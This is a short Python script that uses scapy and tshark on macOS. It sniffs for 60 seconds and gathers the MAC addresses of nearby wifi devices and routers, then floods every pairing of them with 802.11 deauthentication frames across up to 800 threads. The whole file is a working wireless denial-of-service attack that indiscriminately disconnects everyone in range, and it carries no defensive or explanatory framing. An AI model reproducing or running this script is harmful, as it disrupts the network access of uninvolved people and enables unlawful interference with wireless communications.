from scapy.all import *
import concurrent.futures
import time
import subprocess
import re
def deauth(target_mac, access_point_mac):
    print("deauth: router:{}, device:{}".format(access_point_mac,target_mac))
    interface = "en0"
    packet_count = 100
    interval = 0.1
    conf.iface = interface
    pkt = (
        RadioTap() /
        Dot11(addr1=target_mac, addr2=access_point_mac, addr3=access_point_mac) /
        Dot11Deauth()
    )
    sendp(pkt, inter=interval, count=packet_count, verbose=0)
def everything():
    disconnect_cmd = "networksetup -setairportpower en0 off"
    subprocess.run(disconnect_cmd, shell=True)
    disconnect_cmd = "networksetup -setairportpower en0 on"
    subprocess.run(disconnect_cmd, shell=True)
    tshark_cmd = "tshark -i en0 -I -a duration:60"
    tshark_process = subprocess.Popen(tshark_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    mac_regex = r"([0-9a-fA-F]{2}(?::[0-9a-fA-F]{2}){5})"
    mac_addresses = []
    for line in iter(tshark_process.stdout.readline, b''):
        line = line.decode('utf-8')
        mac_matches = re.findall(mac_regex, line)
        if mac_matches:
            mac_addresses.extend(mac_matches)
    disconnect_cmd = "networksetup -setairportpower en0 off"
    subprocess.run(disconnect_cmd, shell=True)
    disconnect_cmd = "networksetup -setairportpower en0 on"
    subprocess.run(disconnect_cmd, shell=True)
    return set(mac_addresses)
maccy=everything()
with concurrent.futures.ThreadPoolExecutor(max_workers=800) as executor:
    for wifi in maccy:
        for device in maccy:
            try:
                executor.submit(deauth, device, wifi)
            except Exception as e:
                time.sleep(60)
                executor.submit(deauth, device, wifi)
